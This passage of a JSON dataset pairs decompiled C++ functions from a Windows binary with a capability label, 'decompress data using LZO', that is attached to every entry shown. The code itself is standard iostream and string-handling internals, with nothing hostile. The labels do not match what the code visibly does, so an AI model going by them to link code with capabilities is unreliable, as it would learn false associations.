= 0;\n        *0x4f733c = 0;\n        *0x4f7340 = 0;\n        *0x4f7344 = 0;\n        *0x4f7348 = 0;\n        *0x4f72c0 = 0x50aaac;\n        *0x4f72c4 = 0x50aac0;\n        fcn.0049cca0(0x4f69c0);\n        fcn.0049b670();\n        *0x4f73d4 = 0;\n        *0x4f73d8 = 0;\n        *0x4f73da = 0;\n        *0x4f73dc = 0;\n        *0x4f73e0 = 0;\n        *0x4f73e4 = 0;\n        *0x4f73e8 = 0;\n        *0x4f7360 = 0x50aaac;\n        *0x4f7364 = 0x50aac0;\n        fcn.0049cca0(0x4f69c0);\n        *0x4f72d0 = *0x4f72d0 | 0x2000;\n        if (*0x4f59f4 == 0) {\n            *0x4f6f50 = *0x4f6f50 + 1;\n            *0x4f7298 = 0x4f7400;\n            *0x4f7334 = 0x4f7400;\n            return;\n        }\n        LOCK();\n        *0x4f6f50 = *0x4f6f50 + 1;\n        *0x4f7298 = 0x4f7400;\n        *0x4f7334 = 0x4f7400;\n        return;\n    }\n    *0x4f6f50 = *0x4f6f50 + 1;\n    return;\n}\n",
        "token_count": 2500
    },
    "0049ab80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0049ab80(uint param_1, int32_t param_2)\n\n{\n    fcn.0048f500(param_2 + 0x6c);\n    fcn.0048f670(param_2);\n    fcn.0049a2e0(1);\n    return param_1;\n}\n",
        "token_count": 75
    },
    "0049ac10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049ac10(int32_t param_1)\n\n{\n    uchar auStack16 [8];\n    \n    *(param_1 + 4) = 6;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0x1002;\n    fcn.0048f530();\n    fcn.0048f670(auStack16);\n    fcn.0048f620();\n    return;\n}\n",
        "token_count": 106
    },
    "0049ae70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0049ae70(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_ECX;\n    uint *var_70h;\n    uint var_6ch;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    piVar1 = arg_ch[1];\n    iVar2 = *arg_ch;\n    if (*(*piVar1 + 0x10) == fcn.0042b520) {\n        var_60h = &var_58h;\n        var_58h._0_1_ = 0;\n        if (iVar2 == 1) {\n            fcn.004906f0(0, 0, \"iostream error\", 0xe);\n        }\n        else {\n            fcn.004906f0(0, 0, 0x5052d8, 0xd);\n        }\n    }\n    else {\n        (**(*piVar1 + 0x10))(piVar1, iVar2);\n    }\n    var_70h = &var_58h;\n    piVar3 = fcn.004906f0(0, 0, 0x5052fb, 2);\n    var_48h = &var_40h;\n    if (*piVar3 == piVar3 + 2) {\n        var_40h = piVar3[2];\n        var_3ch = piVar3[3];\n        var_38h = piVar3[4];\n        var_34h = piVar3[5];\n    }\n    else {\n        var_40h = piVar3[2];\n        var_48h = *piVar3;\n    }\n    var_44h = piVar3[1];\n    *(piVar3 + 2) = 0;\n    *piVar3 = piVar3 + 2;\n    piVar3[1] = 0;\n    uVar4 = sub.msvcrt.dll_strlen(arg_8h);\n    piVar3 = fcn.004906f0(0, 0, arg_8h, uVar4);\n    if (*piVar3 == piVar3 + 2) {\n        var_28h = piVar3[2];\n        var_24h = piVar3[3];\n        var_20h = piVar3[4];\n        var_1ch = piVar3[5];\n        var_30h = &var_28h;\n    }\n    else {\n        var_28h = piVar3[2];\n        var_30h = *piVar3;\n    }\n    var_2ch = piVar3[1];\n    *(piVar3 + 2) = 0;\n    *piVar3 = piVar3 + 2;\n    piVar3[1] = 0;\n    fcn.00481660(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != &var_40h) {\n        fcn.004a34c0(var_48h);\n    }\n    if (var_60h != var_70h) {\n        fcn.004a34c0(var_60h);\n    }\n    in_ECX[3] = piVar1;\n    *in_ECX = 0x50a6c0;\n    in_ECX[2] = iVar2;\n    return;\n}\n",
        "token_count": 934
    },
    "0049b0a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004a6639)\n// WARNING: Removing unreachable block (ram,0x0049b173)\n// WARNING: Removing unreachable block (ram,0x0049b1fe)\n// WARNING: Removing unreachable block (ram,0x004a667b)\n\nvoid __cdecl fcn.0049b0a0(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    uint uVar4;\n    uint *in_ECX;\n    int32_t **ppiVar5;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t **var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    piVar1 = fcn.00428c80();\n    if (*(*piVar1 + 0x10) == fcn.0042b520) {\n        var_48h = &var_40h;\n        var_44h = 0;\n        var_40h = var_40h & 0xffffff00;\n        fcn.004906f0(0, 0, \"iostream error\", 0xe);\n    }\n    else {\n        (**(*piVar1 + 0x10))(piVar1, 1);\n    }\n    var_6ch = &var_40h;\n    fcn.00490cd0(*arg_8h, arg_8h[1] + *arg_8h, 0);\n    if (0x7fffffffU - var_5ch < 2) {\n        uVar4 = fcn.0049ec30(\"basic_string::append\");\n        if (var_30h != arg_8h) {\n            fcn.004a34c0(var_30h);\n        }\n        do {\n            if (var_48h != var_6ch) {\n                fcn.004a34c0(var_48h);\n            }\n            fcn.0041b360(uVar4);\n            if (var_48h != var_6ch) {\n                fcn.004a34c0(var_48h);\n            }\n            fcn.0041b360(uVar4);\n        } while( true );\n    }\n    fcn.00492660(0x5052fb, 2);\n    if (var_5ch + var_44h < 0x10) {\ncode_r0x0049b194:\n        ppiVar3 = fcn.00492660(var_48h, var_44h);\n        ppiVar5 = ppiVar3 + 2;\n        var_30h = *ppiVar3;\n        if (var_30h == ppiVar5) {\ncode_r0x0049b26b:\n            var_30h = &var_28h;\n            var_28h = ppiVar3[2];\n            var_24h = ppiVar3[3];\n            var_20h = ppiVar3[4];\n            var_1ch = ppiVar3[5];\n            goto code_r0x0049b1c2;\n        }\n    }\n    else {\n        uVar2 = 0xf;\n        if (var_48h != var_6ch) {\n            uVar2 = var_40h;\n        }\n        if (uVar2 < var_5ch + var_44h) goto code_r0x0049b194;\n        ppiVar3 = fcn.004906f0(0, 0, &var_58h, var_5ch);\n        ppiVar5 = ppiVar3 + 2;\n        var_30h = *ppiVar3;\n        if (var_30h == ppiVar5) goto code_r0x0049b26b;\n    }\n    var_28h = ppiVar3[2];\ncode_r0x0049b1c2:\n    var_2ch = ppiVar3[1];\n    *(ppiVar3 + 2) = 0;\n    *ppiVar3 = ppiVar5;\n    ppiVar3[1] = NULL;\n    fcn.00481660(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != var_6ch) {\n        fcn.004a34c0(var_48h);\n    }\n    in_ECX[2] = 1;\n    in_ECX[3] = piVar1;\n    *in_ECX = 0x50a6c0;\n    return;\n}\n",
        "token_count": 1150
    },
    "0049b2f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004a66a0)\n// WARNING: Removing unreachable block (ram,0x0049b3db)\n// WARNING: Removing unreachable block (ram,0x0049b460)\n// WARNING: Removing unreachable block (ram,0x004a66c7)\n\nvoid __cdecl fcn.0049b2f0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t **ppiVar4;\n    uint uVar5;\n    uint *in_ECX;\n    int32_t **ppiVar6;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint *var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t **var_30h;\n    int32_t *var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    iVar1 = *arg_ch;\n    piVar2 = arg_ch[1];\n    if (*(*piVar2 + 0x10) == fcn.0042b520) {\n        var_44h = 0;\n        var_48h = &var_40h;\n        var_40h = var_40h & 0xffffff00;\n        if (iVar1 == 1) {\n            fcn.004906f0(0, 0, \"iostream error\", 0xe);\n        }\n        else {\n            fcn.004906f0(0, 0, 0x5052d8, 0xd);\n        }\n    }\n    else {\n        (**(*piVar2 + 0x10))(piVar2, iVar1);\n    }\n    var_6ch = &var_40h;\n    fcn.00490cd0(*arg_8h, arg_8h[1] + *arg_8h, 0);\n    if (0x7fffffffU - var_5ch < 2) {\n        uVar5 = fcn.0049ec30(\"basic_string::append\");\n        if (var_30h != arg_8h) {\n            fcn.004a34c0(var_30h);\n        }\n        do {\n            if (var_48h != var_6ch) {\n                fcn.004a34c0(var_48h);\n            }\n            fcn.0041b360(uVar5);\n        } while( true );\n    }\n    fcn.00492660(0x5052fb, 2);\n    if (var_5ch + var_44h < 0x10) {\ncode_r0x0049b3f9:\n        ppiVar4 = fcn.00492660(var_48h, var_44h);\n        ppiVar6 = ppiVar4 + 2;\n        var_30h = *ppiVar4;\n        if (var_30h == ppiVar6) {\ncode_r0x0049b4d2:\n            var_30h = &var_28h;\n            var_28h = ppiVar4[2];\n            var_24h = ppiVar4[3];\n            var_20h = ppiVar4[4];\n            var_1ch = ppiVar4[5];\n            goto code_r0x0049b427;\n        }\n    }\n    else {\n        uVar3 = 0xf;\n        if (var_48h != var_6ch) {\n            uVar3 = var_40h;\n        }\n        if (uVar3 < var_5ch + var_44h) goto code_r0x0049b3f9;\n        ppiVar4 = fcn.004906f0(0, 0, &var_58h, var_5ch);\n        ppiVar6 = ppiVar4 + 2;\n        var_30h = *ppiVar4;\n        if (var_30h == ppiVar6) goto code_r0x0049b4d2;\n    }\n    var_28h = ppiVar4[2];\ncode_r0x0049b427:\n    var_2ch = ppiVar4[1];\n    *(ppiVar4 + 2) = 0;\n    *ppiVar4 = ppiVar6;\n    ppiVar4[1] = NULL;\n    fcn.00481660(&var_30h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    if (var_48h != var_6ch) {\n        fcn.004a34c0(var_48h);\n    }\n    *in_ECX = 0x50a6c0;\n    in_ECX[2] = iVar1;\n    in_ECX[3] = piVar2;\n    return;\n}\n",
        "token_count": 1195
    },
    "0049b5b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0049b5b0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    *in_ECX = 0x50a6d4;\n    fcn.0046d6c0(arg_8h);\n    return;\n}\n",
        "token_count": 81
    },
    "0049c4a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049c4a0(int32_t param_1, int32_t param_2)\n\n{\n    fcn.0049ac10();\n    fcn.0049c380(param_1 + 0x6c);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = param_2 == 0;\n    return;\n}\n",
        "token_count": 140
    },
    "0049c600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint32_t __thiscall fcn.0049c600(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t extraout_ECX;\n    uint32_t var_8h;\n    uint var_ch;\n    uint var_2ch;\n    uint var_1ch;\n    int32_t iStack24;\n    uint uStack20;\n    uint var_ch_2;\n    \n    if (*(param_1 + 0x78) == 0) {\n        var_8h = var_8h | 1;\n    }\n    *(param_1 + 0x14) = var_8h;\n    if ((*(param_1 + 0x10) & var_8h) == 0) {\n        return var_8h;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    fcn.0048f500(iStack24 + 0x6c);\n    fcn.0049ab80(iStack24, uStack20);\n    fcn.0048f620();\n    fcn.0049c380(uStack20);\n    piVar1 = *(iStack24 + 0x78);\n    if (piVar1 != NULL) {\n        fcn.0048f500(piVar1 + 7);\n        (**(*piVar1 + 8))(uStack20);\n        fcn.0048f670(uStack20);\n        fcn.0048f620();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 350
    },
    "0049c9b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0049c9b0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50b5b0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.0049c4a0(arg_8h);\n    return;\n}\n",
        "token_count": 178
    },
    "0049ca70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0049ca70(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50b5b0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.0049c4a0(arg_8h);\n    return;\n}\n",
        "token_count": 176
    },
    "0049cca0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0049cca0(int32_t param_1, int32_t param_2)\n\n{\n    fcn.0049ac10();\n    fcn.0049cbb0(param_1 + 0x6c);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x74) = 0;\n    *(param_1 + 0x76) = 0;\n    *(param_1 + 0x70) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = param_2 == 0;\n    return;\n}\n",
        "token_count": 154
    },
    "0049ce20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint32_t __thiscall fcn.0049ce20(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint32_t extraout_ECX;\n    uint32_t var_8h;\n    uint var_ch;\n    uint var_2ch;\n    uint var_1ch;\n    int32_t iStack24;\n    uint uStack20;\n    uint var_ch_2;\n    \n    if (*(param_1 + 0x78) == 0) {\n        var_8h = var_8h | 1;\n    }\n    *(param_1 + 0x14) = var_8h;\n    if ((*(param_1 + 0x10) & var_8h) == 0) {\n        return var_8h;\n    }\n    fcn.0049e910(\"basic_ios::clear\");\n    fcn.0048f500(iStack24 + 0x6c);\n    fcn.0049ab80(iStack24, uStack20);\n    fcn.0048f620();\n    fcn.0049cbb0(uStack20);\n    piVar1 = *(iStack24 + 0x78);\n    if (piVar1 != NULL) {\n        fcn.0048f500(piVar1 + 7);\n        (**(*piVar1 + 8))(uStack20);\n        fcn.0048f670(uStack20);\n        fcn.0048f620();\n    }\n    return extraout_ECX;\n}\n",
        "token_count": 351
    },
    "0049d180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0049d180(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50b5c0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    *(in_ECX + 0x76) = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.0049cca0(arg_8h);\n    return;\n}\n",
        "token_count": 189
    },
    "0049d250": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0049d250(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    fcn.0049b670();\n    *in_ECX = 0x50b5c0;\n    *(in_ECX + 0x1d) = 0;\n    in_ECX[0x1c] = 0;\n    *(in_ECX + 0x76) = 0;\n    in_ECX[0x1e] = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    fcn.0049cca0(arg_8h);\n    return;\n}\n",
        "token_count": 189
    },
    "0049e080": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049e080(int32_t *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    ulong uVar10;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0046a230(arg_8h);\n    if (var_20h == '\\0') goto code_r0x0049e157;\n    iVar4 = *(*arg_8h + -0xc);\n    iVar5 = arg_8h + iVar4;\n    iVar9 = *(iVar5 + 8);\n    if (arg_10h < iVar9) {\n        uVar7 = *(iVar5 + 0xc) & 0xb0;\n        if (uVar7 != 0x20) {\n            iVar8 = iVar9 - arg_10h;\n            if (*(iVar5 + 0x75) != '\\0') {\n                var_29h._0_1_ = *(iVar5 + 0x74);\ncode_r0x0049e108:\n                do {\n                    piVar2 = *(arg_8h + iVar4 + 0x78);\n                    if (piVar2[5] < piVar2[6]) {\n                        *piVar2[5] = var_29h;\n                        piVar2[5] = piVar2[5] + 1;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(var_29h);\n                        if (iVar5 == -1) {\n                            fcn.0049c600(*(arg_8h + *(*arg_8h + -0xc) + 0x14) | 1);\n                            iVar5 = *(*arg_8h + -0xc) + arg_8h;\n                            iVar4 = *(iVar5 + 0x14);\n                            goto joined_r0x0049e148;\n                        }\n                    }\n                    iVar4 = *(*arg_8h + -0xc);\n                    iVar8 = iVar8 + -1;\n                } while (iVar8 != 0);\n                iVar5 = arg_8h + iVar4;\n                goto code_r0x0049e1e3;\n            }\n            piVar2 = *(iVar5 + 0x7c);\n            if (piVar2 != NULL) {\n                if (*(piVar2 + 7) == '\\0') {\n                    fcn.00431cc0();\n                    var_29h._0_1_ = 0x20;\n                    if (*(*piVar2 + 0x18) != 0x431f70) {\n                        var_29h._0_1_ = (**(*piVar2 + 0x18))(0x20);\n                    }\n                }\n                else {\n                    var_29h._0_1_ = *(piVar2 + 0x3d);\n                }\n                *(iVar5 + 0x75) = 1;\n                *(iVar5 + 0x74) = var_29h;\n                iVar4 = *(*arg_8h + -0xc);\n                goto code_r0x0049e108;\n            }\ncode_r0x0049e39c:\n            uVar10 = fcn.0049e780();\n            uVar6 = uVar10;\n            if (uVar10 >> 0x20 == 1) {\n                fcn.004a36d0(uVar6);\n                arg_8h = arg_8h + *(*arg_8h + -0xc);\n                arg_8h[5] = arg_8h[5] | 1;\n                if ((*(arg_8h + 4) & 1) == 0) goto code_r0x0049e3dd;\n                fcn.004a3b60();\n            }\n            fcn.004a36d0(uVar6);\n            iVar5 = *(*arg_8h + -0xc);\n            puVar1 = arg_8h + iVar5 + 0x14;\n            *puVar1 = *puVar1 | 1;\n            if ((*(arg_8h + iVar5 + 0x10) & 1) != 0) {\n                fcn.004a3b60();\ncode_r0x0049e3dd:\n                uVar6 = fcn.004a3b60();\n                fcn.004a3840();\n                do {\n                    fcn.0046a2f0();\n                    uVar6 = fcn.0041b360(uVar6);\n                } while( true );\n            }\n            fcn.004a3840();\n            goto code_r0x0049e157;\n        }\ncode_r0x0049e1e3:\n        iVar4 = *(iVar5 + 0x14);\njoined_r0x0049e148:\n        if (iVar4 == 0) {\n            iVar5 = (**(**(iVar5 + 0x78) + 0x30))(arg_ch, arg_10h);\n            iVar4 = *(*arg_8h + -0xc);\n            if (arg_10h != iVar5) {\n                fcn.0049c600();\n                iVar4 = *(*arg_8h + -0xc);\n            }\n            iVar5 = arg_8h + iVar4;\n            if ((uVar7 == 0x20) && (*(iVar5 + 0x14) == 0)) {\n                iVar9 = iVar9 - arg_10h;\n                if (*(iVar5 + 0x75) == '\\0') {\n                    piVar2 = *(iVar5 + 0x7c);\n                    if (piVar2 == NULL) {\n                        fcn.0049e780();\n                        goto code_r0x0049e39c;\n                    }\n                    if (*(piVar2 + 7) == '\\0') {\n                        fcn.00431cc0();\n                        var_29h._0_1_ = 0x20;\n                        if (*(*piVar2 + 0x18) != 0x431f70) {\n                            var_29h._0_1_ = (**(*piVar2 + 0x18))(0x20);\n                        }\n                    }\n                    else {\n                        var_29h._0_1_ = *(piVar2 + 0x3d);\n                    }\n                    *(iVar5 + 0x75) = 1;\n                    *(iVar5 + 0x74) = var_29h;\n                    iVar4 = *(*arg_8h + -0xc);\n                }\n                else {\n                    var_29h._0_1_ = *(iVar5 + 0x74);\n                }\n                do {\n                    piVar2 = *(arg_8h + iVar4 + 0x78);\n                    if (piVar2[5] < piVar2[6]) {\n                        *piVar2[5] = var_29h;\n                        piVar2[5] = piVar2[5] + 1;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(var_29h);\n                        if (iVar5 == -1) {\n                            fcn.0049c600(*(arg_8h + *(*arg_8h + -0xc) + 0x14) | 1);\n                            goto code_r0x0049e1c4;\n                        }\n                    }\n                    iVar4 = *(*arg_8h + -0xc);\n                    iVar9 = iVar9 + -1;\n                } while (iVar9 != 0);\n                iVar5 = arg_8h + iVar4;\n            }\n        }\n    }\n    else {\n        iVar9 = (**(**(iVar5 + 0x78) + 0x30))(arg_ch, arg_10h);\n        iVar5 = *(*arg_8h + -0xc) + arg_8h;\n        if (arg_10h != iVar9) {\n            fcn.0049c600(*(iVar5 + 0x14) | 1);\ncode_r0x0049e1c4:\n            *(arg_8h + *(*arg_8h + -0xc) + 8) = 0;\n            goto code_r0x0049e157;\n        }\n    }\n    *(iVar5 + 8) = 0;\ncode_r0x0049e157:\n    iVar5 = *(*var_1ch + -0xc);\n    if (((((*(var_1ch + iVar5 + 0xd) & 0x20) != 0) && (cVar3 = fcn.0049e8f0(),  cVar3 == '\\0')) &&\n        (piVar2 = *(var_1ch + iVar5 + 0x78),  piVar2 != NULL)) && (iVar5 = (**(*piVar2 + 0x18))(),  iVar5 == -1)) {\n        fcn.0049c600(*(var_1ch + *(*var_1ch + -0xc) + 0x14) | 1);\n    }\n    return arg_8h;\n}\n",
        "token_count": 2094
    },
    "0049e420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.0049e420(int32_t *arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int16_t *piVar3;\n    char cVar4;\n    int16_t iVar5;\n    int16_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    ulong uVar12;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    \n    fcn.0047fec0(arg_8h);\n    if (var_20h == '\\0') goto code_r0x0049e507;\n    iVar10 = *(*arg_8h + -0xc) + arg_8h;\n    iVar7 = *(iVar10 + 8);\n    if (arg_10h < iVar7) {\n        uVar11 = *(iVar10 + 0xc) & 0xb0;\n        if (uVar11 != 0x20) {\n            var_2ch = iVar7 - arg_10h;\n            if (*(iVar10 + 0x76) != '\\0') {\n                iVar6 = *(iVar10 + 0x74);\ncode_r0x0049e4ab:\n                do {\n                    piVar2 = *(iVar10 + 0x78);\n                    piVar3 = piVar2[5];\n                    if (piVar3 < piVar2[6]) {\n                        *piVar3 = iVar6;\n                        piVar2[5] = piVar3 + 1;\n                        iVar5 = iVar6;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(iVar6);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                    }\n                    if (iVar5 == -1) {\n                        fcn.0049ce20(*(iVar10 + 0x14) | 1);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                        iVar8 = *(iVar10 + 0x14);\n                        goto joined_r0x0049e4f4;\n                    }\n                    var_2ch = var_2ch + -1;\n                } while (var_2ch != 0);\n                iVar8 = *(iVar10 + 0x14);\n                goto joined_r0x0049e4f4;\n            }\n            if (*(iVar10 + 0x7c) != NULL) {\n                iVar6 = (**(**(iVar10 + 0x7c) + 0x28))(0x20);\n                *(iVar10 + 0x74) = iVar6;\n                iVar8 = *arg_8h;\n                *(iVar10 + 0x76) = 1;\n                iVar10 = *(iVar8 + -0xc) + arg_8h;\n                goto code_r0x0049e4ab;\n            }\n            fcn.0049e780();\ncode_r0x0049e70a:\n            uVar12 = fcn.0049e780();\n            uVar9 = uVar12;\n            if (uVar12 >> 0x20 == 1) {\n                fcn.004a36d0(uVar9);\n                arg_8h = arg_8h + *(*arg_8h + -0xc);\n                arg_8h[5] = arg_8h[5] | 1;\n                if ((*(arg_8h + 4) & 1) == 0) goto code_r0x0049e74b;\n                fcn.004a3b60();\n            }\n            fcn.004a36d0(uVar9);\n            iVar7 = *(*arg_8h + -0xc);\n            puVar1 = arg_8h + iVar7 + 0x14;\n            *puVar1 = *puVar1 | 1;\n            if ((*(arg_8h + iVar7 + 0x10) & 1) != 0) {\n                fcn.004a3b60();\ncode_r0x0049e74b:\n                uVar9 = fcn.004a3b60();\n                fcn.004a3840();\n                do {\n                    fcn.0047ff80();\n                    uVar9 = fcn.0041b360(uVar9);\n                } while( true );\n            }\n            fcn.004a3840();\n            goto code_r0x0049e507;\n        }\n        iVar8 = *(iVar10 + 0x14);\njoined_r0x0049e4f4:\n        if (iVar8 == 0) {\n            iVar8 = (**(**(iVar10 + 0x78) + 0x30))(arg_ch, arg_10h);\n            iVar10 = *(*arg_8h + -0xc);\n            if (arg_10h != iVar8) {\n                fcn.0049ce20();\n                iVar10 = *(*arg_8h + -0xc);\n            }\n            iVar10 = iVar10 + arg_8h;\n            if ((uVar11 == 0x20) && (*(iVar10 + 0x14) == 0)) {\n                var_2ch = iVar7 - arg_10h;\n                if (*(iVar10 + 0x76) == '\\0') {\n                    if (*(iVar10 + 0x7c) == NULL) goto code_r0x0049e70a;\n                    iVar6 = (**(**(iVar10 + 0x7c) + 0x28))(0x20);\n                    *(iVar10 + 0x74) = iVar6;\n                    iVar7 = *arg_8h;\n                    *(iVar10 + 0x76) = 1;\n                    iVar10 = *(iVar7 + -0xc) + arg_8h;\n                }\n                else {\n                    iVar6 = *(iVar10 + 0x74);\n                }\n                do {\n                    piVar2 = *(iVar10 + 0x78);\n                    piVar3 = piVar2[5];\n                    if (piVar3 < piVar2[6]) {\n                        *piVar3 = iVar6;\n                        piVar2[5] = piVar3 + 1;\n                        iVar5 = iVar6;\n                    }\n                    else {\n                        iVar5 = (**(*piVar2 + 0x34))(iVar6);\n                        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n                    }\n                    if (iVar5 == -1) {\n                        fcn.0049ce20(*(iVar10 + 0x14) | 1);\n                        goto code_r0x0049e576;\n                    }\n                    var_2ch = var_2ch + -1;\n                } while (var_2ch != 0);\n            }\n        }\n    }\n    else {\n        iVar7 = (**(**(iVar10 + 0x78) + 0x30))(arg_ch, arg_10h);\n        iVar10 = *(*arg_8h + -0xc) + arg_8h;\n        if (arg_10h != iVar7) {\n            fcn.0049ce20(*(iVar10 + 0x14) | 1);\ncode_r0x0049e576:\n            *(arg_8h + 